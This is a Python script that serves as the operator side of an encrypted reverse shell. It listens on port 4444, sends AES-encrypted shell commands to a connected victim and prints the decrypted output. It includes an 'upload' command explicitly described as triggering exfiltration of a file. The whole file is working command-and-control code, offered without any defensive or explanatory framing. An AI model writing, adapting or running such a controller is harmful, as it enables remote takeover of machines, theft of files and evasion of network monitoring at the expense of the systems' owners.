import socket
import base64
import struct
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

KEY = b'Sixteen byte key'  
BLOCK_SIZE = 16

def encrypt_command(command):
    cipher = AES.new(KEY, AES.MODE_CBC, iv=KEY)
    encrypted = base64.b64encode(cipher.encrypt(pad(command.encode(), BLOCK_SIZE)))
    return encrypted

def decrypt_output(ciphertext):
    cipher = AES.new(KEY, AES.MODE_CBC, iv=KEY)
    decrypted = unpad(cipher.decrypt(base64.b64decode(ciphertext)), BLOCK_SIZE)
    return decrypted.decode()

def send_msg(sock, msg):
    msg_length = struct.pack('>I', len(msg))
    sock.sendall(msg_length + msg)

def recv_msg(sock):
    raw_len = recvall(sock, 4)
    if not raw_len:
        return None
    msg_len = struct.unpack('>I', raw_len)[0]
    return recvall(sock, msg_len)

def recvall(sock, n):
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def main():
    s = socket.socket()
    s.bind(("0.0.0.0", 4444))
    s.listen(1)

    print("[*] Waiting for connection...")
    client, addr = s.accept()
    print(f"[*] Connected to {addr[0]}:{addr[1]}")

    try:
        while True:
            command = input("Shell> ").strip()
            if not command:
                continue

            encrypted_command = encrypt_command(command)
            send_msg(client, encrypted_command)

            if command.lower() == "exit":
                break

            if command.startswith("upload "):
                filename = command.split(" ", 1)[1]
                print(f"[*] Triggering exfiltration of file: {filename}")
                continue

            data = recv_msg(client)
            if data is None:
                print("[*] Connection closed by remote host.")
                break

            try:
                print(decrypt_output(data))
            except Exception as e:
                print(f"[!] Error decrypting output: {e}")

    except KeyboardInterrupt:
        print("\n[*] Interrupted by user.")

    finally:
        client.close()
        s.close()

if __name__ == "__main__":
    main()
